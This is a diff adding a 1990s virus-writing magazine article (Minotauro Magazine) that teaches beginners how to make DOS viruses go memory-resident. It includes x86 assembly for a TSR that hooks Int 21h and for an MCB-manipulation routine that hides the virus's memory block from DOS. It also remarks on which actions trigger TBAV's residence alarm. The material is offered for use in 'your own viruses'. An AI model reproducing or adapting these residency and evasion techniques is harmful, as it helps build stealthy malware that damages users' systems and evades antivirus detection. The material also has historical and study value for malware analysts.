@@ -1,0 +1,185 @@
+Memory Residence Methods.
+-----------------------------------------------------------------
+
+     In this article, I'll try to explain the more common methods
+used to make viruses go resident.  The focus will be more on the
+practical than the theoretical, leaving clear the fundamentals so
+that you can take advantage of them, especially in the case of the
+MCB.  The article will show examples of the two techniques
+described which can (in the case of the MCB) be directly applied to
+your own viruses.  The theory is not very detailed, but everything
+a beginner needs to know to use these methods is present.  With the
+information the article provides, the beginner who wishes to get
+deeper into the theory can simply read a guide or manual on memory
+residence, since the necessary basics are explained here (I hope).
+
+Let's begin:
+     The most used methods to make a virus go resident are: 
+     o    those available through DOS or 
+     o    the MCB (Memory Control Block) method.
+
+     The former is the simplest way to do it, but also the most
+inefficient because it informs DOS it's leaving something behind in
+memory.  Besides, when you execute this function, control is
+returned to DOS.  Whatever program you attempt to run will
+terminate!  The virus which uses this technique must re-execute
+itself to avoid exiting to DOS during it's installation into
+memory.  To remain resident, it executes itself again (service 4bh)
+and during it's second execution it hooks Int27h or calls service
+31 of Int 21, in it's turn giving control to the "father" program
+(the one loaded first).  The father program can then end, executing
+the host.  If this isn't done (like when executing Int 21), control
+would be passed to the command interpreter.
+
+     One characteristic of viruses which use this technique is that
+they tend to attach to the beginning of the file; these services
+will resident the amount of required from the beginning of the file
+in memory....  If we have a 50K .COM and the virus is at the end,
+and we use Int 27 to attempt to leave resident 1K, for example,
+what would be placed in memory would be the first K of the COM, not
+the virus.  Obviously, we can't just leave 50K resident.... we can
+make the virus go resident we can move (it?) to another block,
+transfer control, and then this will give control to the "father"
+program.  To avoid all this, many viruses attach themselves to the
+beginning of the programs they infect.  Of course, this is slow,
+since we have to read the whole file and copy it after the virus. 
+If the virus attaches to the end of the file, we only have to write
+the virus, not the virus AND the file.  This method is not very
+elegant; more than just slow, other things can happen if the
+infection places the virus at the beginning........
+
+Below is the source to a TSR, NOT a virus, just a normal TSR to
+illustrate how it works.  This example hooks Int 21 and then passes
+control without doing anything.  Code can be added to make it do
+what ever you want.
+
+===================================================================
+===================================================================
+code    segment 
+        assume cs:code,ds:code
+        org   100h             
+start:
+     jmp  instalar            ;Jump to the installation
+                              ;routine.
+
+;We put the original Int21 address in this variable.
+old_21    dd   2
+
+new_21:
+
+;Here's the routine which hooks Int 21.
+
+     jmp  cs:[old_21]              ;Jump to the original int.
+
+instalar:
+
+;Obtain the original Int 21 Vector
+     mov  ax, 3521h
+     int  21h
+     mov  word ptr old_21, bx 
+     mov  word ptr old_21+2, es    
+
+;Set the new Int 21 vector.
+        mov     ax,2521h          
+        push cs
+        pop  ds
+        mov     dx, offset new_21
+        int     21h
+
+;Now it's resident
+     mov  ah, 31h
+     mov  dx, 30d    ;<--------- Number of paragraphs(16 bytes)   
+     int  21h        ;leave resident.    
+
+code    ends
+end  start
+===================================================================
+===================================================================
+
+    The second method is a little more complex than simply calling
+Int 27h, but it's much more effective.  To understand how it works,
+you must be aware that DOS creates a control block for each memory
+block used.  This control block is 16 bytes long (a paragraph)and
+is just above the assigned memory block.  In a COM file, for
+example, CS - 1 contains the address of this block.  In offset 3 of
+the same we can find the amount of memory used by the program.... 
+To make our program resident, we must subtract from that value the
+length of the virus, free up the memory which is no longer used
+(service 4ah), and assign it to our program (service 48h).  We
+finish by marking the MCB of the segment to which we moved our
+virus with '8' in offset 1, to fool DOS into not using that part of
+memory.  When we mark the block we use an '8' to identify it
+because DOS uses the same.
+
+    The code that follows shows how it's done.....  the code will
+leave a virus resident from a COM file.  To load a virus from an
+EXE we must keep in mind that the MCB segment to be modified is
+obtained by subtracting 1 from DS, not CS.
+
+===================================================================
+===================================================================
+;I pass the code segment to AS, I subtract it and pass to ES to   
+;obtain the amount of memory reserved by the host program (ES:[3]),
+;which is in AX.......
+
+     mov  ax, cs         ;With this we obtain the MCB segment.
+     dec  ax             
+
+     mov  es, ax              ;Here we obtain from the MCB the 
+     mov  ax, es:[3]          ;amount of memory used.
+
+;I subtract the length of the virus from the memory used by the
+;host and place the result in AX
+
+     sub  ax, bx         ;BX contains the length of the virus
+                         ;in paragraphs
+
+;We pass the result of the previous operation to BX so as to then
+;call the service which frees memory, with the new size and the
+;segment in ES.
+     push bx             ;Save the amount of memory to be reserved
+     mov  bx, ax         ;Pass the new amount to BX.
+     push cs 
+     pop  es
+     mov  ah, 4ah
+     int  21h
+
+;I assign the freed memory to my virus, the assigned memory segment
+;goes to AX.  I decrease BX because DOS will use one paragraph.
+
+     pop  bx             ;Pop the amount of memory to be reserved.
+     dec  bx
+     mov  ah, 48h
+     int  21h
+
+;I decrease AX and pass it to ES; that way I point to the paragraph
+;DOS uses as a control, I mark the paragraph at offset 1 with an 8 
+;so that DOS thinks it's a part of itself and not use this part of 
+;memory.  I then increment AX again and pass it to ES, so that ES 
+;points to the memory the virus will use.
+
+     dec  ax
+     mov  es, ax
+     mov  word ptr es:[1], 8
+     mov  word ptr es:[8],'XX'    ;Optional: name that block.
+     inc  ax
+     mov  es, ax
+
+     push es                    ;Save the address of the virus    
+                                ;segment.
+
+===================================================================
+===================================================================
+
+All that remains is to move the virus to the reserved segment, a
+simple matter of doing a "rep movsb" to the segment to which ES
+points and that's it, the virus is resident.
+
+NOTE:
+The routine by itself does not set off any alarms;  TBAV's
+residence alarm is set off when it detects a hook to Int 21h or
+13h.
+
+
+                    Text by Zarathustra for Minotauro Magazine
+ 
